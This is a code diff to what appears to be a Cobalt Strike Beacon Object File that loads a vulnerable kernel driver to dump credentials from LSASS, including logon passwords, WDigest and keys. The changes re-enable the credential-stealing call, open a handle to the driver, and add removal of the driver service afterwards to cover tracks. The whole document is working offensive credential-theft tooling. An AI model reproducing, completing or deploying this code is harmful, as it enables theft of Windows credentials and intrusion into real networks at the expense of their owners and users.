@@ -1,3 +1,5 @@
+#include <windows.h>
+
 #include "beacon.h"
 #include "defs.h"
 #include "ioctl.h"
@@ -14,6 +16,7 @@
 #include "lsass_getkeys.c"
 #include "lsass_logonpasswords.c"
 #include "lsass_wdigest.c"
+#include "services.c"
 
 formatp outputbuffer;
 
@@ -21,6 +24,7 @@ int go(char *args, int argLen)
 {
     datap parser;
 	BeaconDataParse(&parser, args, argLen);
+    
     int prvFlagLen = 0;
     int modeLen = 0;
     char* prvFlag = BeaconDataExtract(&parser, &prvFlagLen);
@@ -29,9 +33,10 @@ int go(char *args, int argLen)
         BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
         return FALSE;
     }
+    
     int provider = BeaconDataInt(&parser);
     char* mode = BeaconDataExtract(&parser, &modeLen);
-
+    
     if (!mode || modeLen <= 0 || mode[0] == '\0')
     {
         BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
@@ -65,8 +70,7 @@ int go(char *args, int argLen)
     BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
     if (!bResult) 
     {
-        BeaconFormatPrintf(&outputbuffer, "Failed to enable privilege! Error code: %llx\n", GetLastError());
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconPrintf(CALLBACK_ERROR, "Failed to enable privilege! Error code: %llx", GetLastError());
         BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
@@ -75,7 +79,9 @@ int go(char *args, int argLen)
     PROVIDER_INFO* prov_info = GetProviderInfo(provider);
     if (prov_info == NULL)
     {
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
+        BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
     else
@@ -83,8 +89,25 @@ int go(char *args, int argLen)
         BeaconFormatPrintf(&outputbuffer, "[INFO] Provider: %s\n", prov_info->service_name);
     }
 
-    isServiceInstalled(provider);
-    //return FALSE;
+
+    if (!isServiceInstalled(provider))
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
+        return FALSE;
+    }
+    
+
+    // Get handle to driver
+    HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
+        return FALSE;
+    }
+
 
     char* WindowsVersion = GetWinVersion();
     BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);
@@ -97,19 +120,25 @@ int go(char *args, int argLen)
     {
         BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
+        CloseHandle(hFile);
         return FALSE;
     }
 
+    
+    StealLSASSCredentials(hFile, WindowsVersion);
 
-    //StealLSASSCredentials(hFile, WindowsVersion);
 
+    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
+    CloseHandle(hFile);
     
     // Stop and delete service
-
-    //BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
-    //CloseHandle(hFile);
+    if (!removeService(provider))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+    }
 
     BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
     BeaconFormatFree(&outputbuffer);
     
+    return 0;
 }
